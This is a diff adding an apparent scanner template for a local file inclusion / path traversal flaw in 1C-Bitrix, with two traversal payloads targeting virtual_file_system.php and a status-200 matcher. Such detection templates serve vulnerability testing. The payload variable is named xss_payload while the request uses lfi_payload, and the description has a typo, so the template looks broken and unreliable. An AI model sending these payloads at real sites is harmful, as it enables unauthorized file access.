@@ -1,0 +1,26 @@
+id: bitrix_lfi
+
+info:
+
+  name: 1C-Bitrix Local File Inclusion
+  author: vag4b0nd
+  severity: medium
+  description: The template detion LFI in Bitrix
+  tags: Bitrix,LFI,path_traversal
+
+requests:
+  - method: GET
+    path:
+        - "{{RootURL}}/{{lfi_payload}}"
+
+    payloads:
+        xss_payload:
+            - '/.htaccess/пистолетики/../../""""""""""""""""""""""""""""""/../bitrix/""""""""""""""""""""""""""""""/../virtual_file_system.php/""""""""""""""""""""""""""""""/../x/..'
+            - '/.htaccess/пистолетики/../../../\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../bitrix/\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../virtual_file_system.php/\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"/../x/..'
+
+    redirects: false
+    matchers:
+      - type: status
+        status:
+          - 200
+
